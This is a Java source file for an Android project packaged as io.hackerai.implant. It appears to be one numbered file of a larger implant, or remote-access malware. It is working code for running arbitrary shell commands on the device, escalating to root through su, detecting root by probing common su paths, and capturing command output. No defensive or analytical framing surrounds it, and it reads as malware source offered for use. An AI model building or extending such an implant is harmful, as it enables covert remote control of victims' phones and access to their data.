// ============================================================
// FILE 18: utils/ShellUtils.java
// ============================================================
package io.hackerai.implant.utils;

import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

/**
 * ShellUtils — execute arbitrary shell commands on the device.
 *
 * Capabilities:
 *   - Run commands as the app's UID (no root required)
 *   - Root command execution (if device is rooted)
 *   - Timeout enforcement (15s default)
 *   - stdin/stdout/stderr capture
 *   - SU check
 */
public class ShellUtils {
    private static final String TAG = "ShellUtils";
    private static final long DEFAULT_TIMEOUT_MS = 15_000L;
    private static final ExecutorService executor =
            Executors.newCachedThreadPool();

    /**
     * Execute a shell command and return stdout + stderr.
     *
     * @param command The shell command to execute.
     * @return Combined stdout and stderr output.
     */
    public static String execute(String command) {
        return execute(command, DEFAULT_TIMEOUT_MS);
    }

    /**
     * Execute with custom timeout.
     */
    public static String execute(String command, long timeoutMs) {
        try {
            Process process = Runtime.getRuntime().exec(command);

            // Capture stdout
            Future<String> stdoutFuture = executor.submit(() -> {
                StringBuilder sb = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(
                        new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                }
                return sb.toString();
            });

            // Capture stderr
            Future<String> stderrFuture = executor.submit(() -> {
                StringBuilder sb = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(
                        new InputStreamReader(process.getErrorStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                }
                return sb.toString();
            });

            // Wait with timeout
            boolean finished = process.waitFor(timeoutMs, TimeUnit.MILLISECONDS);
            if (!finished) {
                process.destroyForcibly();
                return "[TIMEOUT after " + timeoutMs + "ms]";
            }

            String stdout = stdoutFuture.get(1000, TimeUnit.MILLISECONDS);
            String stderr = stderrFuture.get(1000, TimeUnit.MILLISECONDS);

            int exitCode = process.exitValue();
            String result = stdout + (stderr.isEmpty() ? "" : "\n[STDERR]\n" + stderr);
            if (exitCode != 0) {
                result += "\n[EXIT CODE: " + exitCode + "]";
            }

            Log.d(TAG, "Command: " + command + " | Exit: " + exitCode
                    + " | Output: " + result.substring(0, Math.min(200, result.length())));

            return result.trim();

        } catch (Exception e) {
            Log.e(TAG, "Command failed: " + command, e);
            return "[ERROR] " + e.getMessage();
        }
    }

    /**
     * Execute a command as root (requires rooted device).
     * Returns null if SU is not available.
     */
    public static String executeAsRoot(String command) {
        return executeAsRoot(command, DEFAULT_TIMEOUT_MS);
    }

    public static String executeAsRoot(String command, long timeoutMs) {
        if (!isRootAvailable()) {
            Log.w(TAG, "Root not available for command: " + command);
            return "[ERROR] Root not available";
        }

        try {
            Process process = Runtime.getRuntime().exec("su");

            OutputStream stdin = process.getOutputStream();
            InputStream stdout = process.getInputStream();
            InputStream stderr = process.getErrorStream();

            // Send command
            stdin.write((command + "\n").getBytes("UTF-8"));
            stdin.write("exit\n".getBytes("UTF-8"));
            stdin.flush();

            // Read output
            StringBuilder output = new StringBuilder();
            byte[] buffer = new byte[4096];
            int read;

            // Poll both streams with timeout
            long deadline = System.currentTimeMillis() + timeoutMs;
            while (System.currentTimeMillis() < deadline) {
                while (stdout.available() > 0) {
                    read = stdout.read(buffer);
                    if (read > 0) output.append(new String(buffer, 0, read, "UTF-8"));
                }
                while (stderr.available() > 0) {
                    read = stderr.read(buffer);
                    if (read > 0) output.append("[ERR] ")
                            .append(new String(buffer, 0, read, "UTF-8"));
                }
                if (output.toString().contains("\n$")
                        || output.toString().contains("\n#")) {
                    break;
                }
                try { Thread.sleep(50); } catch (InterruptedException ie) { break; }
            }

            int exitCode = process.waitFor();
            Log.d(TAG, "Root command exit: " + exitCode);

            stdin.close();
            stdout.close();
            stderr.close();
            process.destroy();

            return output.toString().trim();

        } catch (Exception e) {
            Log.e(TAG, "Root command failed", e);
            return "[ERROR] " + e.getMessage();
        }
    }

    /**
     * Check if the device has root access.
     */
    public static boolean isRootAvailable() {
        try {
            // Check common su paths
            String[] suPaths = {
                    "/system/bin/su",
                    "/system/xbin/su",
                    "/sbin/su",
                    "/system/sd/xbin/su",
                    "/data/local/xbin/su",
                    "/data/local/bin/su",
                    "/su/bin/su"
            };
            for (String path : suPaths) {
                if (new File(path).exists()) return true;
            }
            // Also try executing "which su"
            Process process = Runtime.getRuntime().exec("which su");
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String line = reader.readLine();
            reader.close();
            process.waitFor();
            return line != null && !line.isEmpty();
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Execute a command in a shell with environment variables.
     */
    public static String executeWithEnv(String command,
                                         java.util.Map<String, String> envVars) {
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
            if (envVars != null) {
                pb.environment().putAll(envVars);
            }
            Process process = pb.start();

            StringBuilder output = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            int exitCode = process.waitFor();
            return output.toString().trim();

        } catch (Exception e) {
            return "[ERROR] " + e.getMessage();
        }
    }

    /**
     * Run a command and stream output to logcat.
     * Useful for long-running commands.
     */
    public static void executeAndLog(String command) {
        executor.submit(() -> {
            try {
                Process process = Runtime.getRuntime().exec(command);
                try (BufferedReader reader = new BufferedReader(
                        new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        Log.i(TAG, "[CMD] " + line);
                    }
                }
                process.waitFor();
            } catch (Exception e) {
                Log.e(TAG, "executeAndLog failed", e);
            }
        });
    }
}
